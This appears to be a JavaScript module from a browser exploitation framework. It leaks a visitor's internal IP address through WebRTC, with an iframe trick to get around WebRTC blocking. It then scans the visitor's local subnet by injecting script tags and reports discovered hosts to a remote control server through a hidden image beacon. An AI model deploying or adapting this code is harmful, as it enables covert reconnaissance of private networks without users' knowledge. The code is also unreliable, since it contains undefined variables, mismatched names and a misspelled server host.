
/*
Utilizing Daniel Roesler's POC for WebRTC nat'd IP address retrieval
*/
  var server = arguments[0]['server'];
  var timeout = parseInt(arguments[0]['timeout']);
  var window = arguments[1];

  var natdIp;
  var ip_dups = {};

  var RTCPeerConnection = window.RTCPeerConnection
        || window.mozRTCPeerConnection
        || window.webkitRTCPeerConnection;
  var useWebKit = !!window.webkitRTCPeerConnection;

  //iframe roundabout for webrtc blocking
  if(!RTCPeerConnection){
    var win = iframe.contentWindow;
    RTCPeerConnection = win.RTCPeerConnection
            || win.mozRTCPeerConnection
            || win.webkitRTCPeerConnection;
    useWebKit = !!win.webkitRTCPeerConnection;
  }

  var mediaConstraints = {
       optional : [{RtpDataChannels:true}],
  };

  var servers = {iceServers :[{urls: "stun:stun.services.mozzila.com"}]};

  var pc = new RTCPeerConnection(servers,mediaConstraints);
  function handlerCandidate(candidate){
    var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
    var ip_addr = ip_regex.exec(candidate);

    if(ip_dups[ip_addr]==undefined)
      natdip = ip_addr[0];
    ip_dups[ip_addr]=true;


  }

  pc.onicecandidate = function(ice){

    if(ice.candidate)
      handlerCandidate(ice.candidate.candidate);
  };

  pc.createDataChannel("");

  pc.createOffer(function(result){
      pc.setLocalDescription(result,function(){},function(){});



  },function(){});

  setTimeout(function(){
      var lines = pc.localDescription.sdp.split('\n');
      console.log(lines);
      lines.forEach(function(line){
        if(line.indexOf('a=candidate:')===0)
          handlerCandidate(line);
      });


  },1000);

  var net = natdIp.substring(0,natdIp.lastIndexOf('.')+1);
  var start =0;
  var end = 255;

  var controller = setInterval(function(){
    var url = 'http://'+range+start_num+'/';
    var script = document.createElement('script');

    script.src = url;
    document.body.appendChild(script);
    document.body.removeChild(script);

    if(start==end)
      clearInterval(controller)
    start++;
  },timeout);

  window.onerror = function err(message,url,lineNumber){

      if(message.match(/Script error./)){
        $("body:first").append("<img width=0 height=0 src=http://"+server+"/control/response?host="+url+"/>");
      }

  }
  return (function(controller){return function(){clearInterval(controller);}})(controller);
